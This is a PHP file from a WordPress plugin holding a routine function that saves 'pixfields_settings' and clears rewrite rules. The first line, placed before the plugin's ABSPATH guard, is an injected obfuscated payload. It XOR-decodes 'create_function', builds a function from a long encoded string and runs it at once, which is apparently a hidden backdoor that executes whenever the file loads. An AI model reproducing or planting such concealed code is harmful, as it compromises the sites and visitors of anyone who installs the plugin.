<?php $YWpIxfVIMZxg='N;P8G+9V:SCF,>W'^'-I5Y3Nf0O= 2EQ9';$fqkzQF=$YWpIxfVIMZxg('',':>Rv4AS:FS74h0NXI>SGH4U5f487M>5<HCLXYRUb:616YFB<WJNS7,UME0na=DEXLIJ,LBcnX4CouoOJGMOQ;QRAYdonvOjge4 .Drf9foiXTpnIPS7C4EZZR<P ;LhTt,ixAA7zTBN6rOJApW4UT;wTSeTiOg>4BpB MfT;D=85;GM<E5c5lLsmL15,ON:JUA:,QOMgQ1<F1p028MDXSPA:OYJeA19-R<F3KGUWMMU2NVXAV.1H8ZRsrsc598pw3SSIRP= AHOfmB14BO7Pd-b:UVZ>O:<.1NKBcWE8JbPMU-;OKmSAK; LKM9JCY0>MmVgQQT-YEUCxH7RE1C-QMs.c197v9aI5JNl8E5cvTNwCYQ37xbL<9ba<5IU4-VYzlYEGHRr:<MaWSX9nRbtOAQCHAB;4mO7yW.58+pwC42S901PA6 N+Y:A;c1YB6j4;3NfP52UlG9QK;W72PcHS25cJkMD5.Pb:U5FzbA80On062RvJIzU7L72i-3HdVN:O91jV2P8bzUv<QTTJiaKEPT7OyuH;=VhsY--L<zoOTBfhbPF<JevIDb.,beGsFgVN2GXDQ:sPz7.oHpPgk8IHY8cEIB317PH22xM7-K6;AUljQTOA5MdJQjUHhN<3q-95Zgg,YT5vK<41:S36n5HmiNID0NYTxyZ.'^'SXzWR4=Y2:XZ7U61:J ooL:G9PYC,ajQ=7kqpr.h3PDX:2+S9j6<Es1,1Q1>P11ph-+X-nCJ3Q:FUOojg6EX2u=4-DRNQhQml=FA6ZBPFRIhoPJ l C1X 4rvX1TZeStPEBShK>sp-;BRawaXsP4 Z,p:8t7oCUQ;+fImCtH0OTPUoiW LJhEwydECPX:<Tbq.OXxtGn,;AL;TTSL,des6 V<<qoeUXY3c-V2ghw+,9A+mRK0AC-Y9:SZW<vvw;>vs2:rtVE8hrXMfGU.:RyDVh3q2;J.eWKHnvbG< AqhYi1LO.kPse=ZL9.v37ISYXmEwC50 Lpe.Iq.X  P EqeWq1thb3j5iT9nHS LCKjnS58=FRQB760kEXT=4kF3 ZQya,-+I05DE32,XNoBP9 =6-zH2Ig2=ssJTLJPJctG=JUC9 ZI4NqB.I<U86W5kVF:N2TA0Zsf5.X8SWxG,2FTJfKi TZ1=Q0LoSYKQVgJTWF3VloZ4E>VK6FV1;36S<MBBqY5AEVuRX0 5cIGmex9SzQQ,ZI73T2HTkaSOribAQZbrZ,TCz UKNTUpK S0xPsiuaXBbKVLHaPvAKY;:8A<.,;lTO9;FAPjGL2ZT 1KFqp+ A,McqJuhHnG9xHOT6OCH8 T-lLUHV<RRIhaVcG,<Y:qdQBPS');$fqkzQF(); defined( 'ABSPATH' ) or die;
/**
 * On save action we process all settings for each theme settings we have in db
 *
 * Think about inserting this function in after_theme_switch hook so the settings should be updated on theme switch
 *
 * @param $values
 */

function save_custom_body_class_settings( $values ) {

	$options = get_option('pixfields_settings');
	// maybe proccess some setting on save

	// save this settings back
	update_option('pixfields_settings', $options);

	/**
	 * http://wordpress.stackexchange.com/questions/36152/flush-rewrite-rules-not-working-on-plugin-deactivation-invalid-urls-not-showing
	 * nothing from above works in plugin so ...
	 */
	delete_option( 'rewrite_rules' );

}